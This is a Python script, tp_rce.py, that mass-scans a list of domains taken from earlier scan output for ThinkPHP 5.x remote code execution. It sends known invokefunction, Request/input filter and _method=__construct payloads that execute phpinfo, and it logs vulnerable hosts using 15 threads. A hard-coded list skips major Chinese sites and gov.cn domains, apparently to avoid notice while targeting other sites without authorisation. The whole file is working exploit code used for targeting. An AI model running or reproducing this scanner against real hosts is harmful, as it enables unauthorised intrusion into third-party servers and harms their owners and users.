#!/usr/bin/env python3
"""tp_rce.py - ThinkPHP 5.x RCE batch check"""
import urllib.request, urllib.parse, re
from concurrent.futures import ThreadPoolExecutor, as_completed

OUT = "/tmp/tp_rce_hits.txt"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
LOCK_ = __import__("threading").Lock()
BIG = ["sina","sohu","163.com","baidu","douyin","taobao","pcauto","58pic","ibaotu",
       "finance","it.sohu","live.douyin","jiameng.baidu","cambridge","gov.cn","bilibili",
       "qianzhan","chinacable","dedemao","cnhuinuo","trackingmore","toybaba","cnal.com"]

def fetch(url, timeout=8, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA,"Content-Type":"application/x-www-form-urlencoded"})
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","ignore")
    except Exception:
        return 0, ""

def log(s):
    with LOCK_:
        open(OUT,"a").write(s+"\n")

def check(d):
    if any(b in d for b in BIG): return
    B = "\\"
    urls = [
        ("http://%s/index.php?s=/index/%sthink%sapp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1" % (d,B,B), "tp5.0"),
        ("http://%s/index.php?s=/index/%sthink%sRequest/input&filter[]=phpinfo&data=1" % (d,B,B), "tp5.0-req"),
        ("http://%s/index.php?s=index/%sthink%sapp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" % (d,B,B), "tp5.0b"),
    ]
    for url, tag in urls:
        code, body = fetch(url)
        if code == 200 and ("phpinfo()" in body or "PHP Version" in body or ("Configuration" in body and "php.ini" in body)):
            log("!!! TP_RCE %s [%s] %s" % (d, tag, url))
            print("!!! TP_RCE %s [%s]" % (d, tag), flush=True)
            return
    code, body = fetch("http://%s/index.php?s=index/%sthink%sRequest/input" % (d,B,B),
                       data="_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1")
    if code == 200 and ("phpinfo()" in body or "PHP Version" in body):
        log("!!! TP_RCE %s [tp5.1] " % d)
        print("!!! TP_RCE %s [tp5.1]" % d, flush=True)
        return

def main():
    doms = set()
    for line in open("/tmp/web_vuln2.txt"):
        if "thinkphp" in line:
            m = re.search(r"\[(?:CMS|UPLOAD)\]\s+([a-z0-9.-]+)", line)
            if m: doms.add(m.group(1).strip().lower())
    print("tp_rce: %d thinkphp domains" % len(doms), flush=True)
    with ThreadPoolExecutor(max_workers=15) as ex:
        futs = {ex.submit(check, d): d for d in doms}
        for fut in as_completed(futs): fut.result()
    print("[tp_rce done]", flush=True)

if __name__ == "__main__": main()
